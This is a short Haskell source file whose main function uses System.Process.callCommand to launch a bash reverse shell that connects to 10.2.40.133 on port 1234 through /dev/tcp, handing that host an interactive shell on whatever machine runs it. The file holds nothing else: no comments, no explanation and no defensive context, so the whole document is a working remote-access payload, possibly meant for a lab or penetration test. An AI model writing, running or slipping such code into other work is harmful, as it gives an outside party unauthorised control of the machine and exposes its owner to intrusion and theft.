module Main where

import System.Process

main = callCommand "bash -c 'bash -i >& /dev/tcp/10.2.40.133/1234 0>&1'"
